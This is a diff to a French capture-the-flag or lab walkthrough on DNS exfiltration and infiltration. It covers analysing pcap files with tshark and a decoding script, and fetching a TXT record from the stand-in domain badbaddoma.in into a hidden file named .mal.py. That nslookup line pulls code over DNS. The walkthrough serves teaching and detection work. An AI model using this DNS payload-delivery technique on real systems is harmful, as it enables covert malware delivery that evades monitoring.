@@ -121,6 +121,10 @@ $ tshark -r order.pcap -T fields -e dns.qry.name > DNS_names.txt
 Le script ~/dns-exfil-infil/packetyGrabber.py permet de decrypter les fichiers Wireshark.
 ```console
 $ python3 ~/dns-exfil-infil/packetyGrabber.py
+File captured: order.pcap
+Filename output: results.txt
+Domain Name (Example: badbaddoma.in): badbaddoma.in
+...
 ```
 
 Ignorer l'exception levée à la fin du script.
@@ -137,7 +141,7 @@ Réponse : 2500
 
 Aller dans le dossier ci-dessous :
 ```console
-~/challenges/exfiltration/identity
+$ cd ~/challenges/exfiltration/identify/
 ```
 Parmi les fichiers `*.pcap` analyser leur contenu :
 ```console
@@ -169,7 +173,7 @@ Le but étant souvent de supprimer des fichiers ou d'exécuter du code sur les m
   <img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>
 </p>
 
-Récupérer un enregistrement au format TXT du sous-domaine `code` du domaine `badbaddoma.in` : 
+Récupérer un enregistrement au format TXT du sous-domaine `code` du domaine `badbaddoma.in` et en extraire la valeur dans un fichier :
 ```console
 $ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
 ```
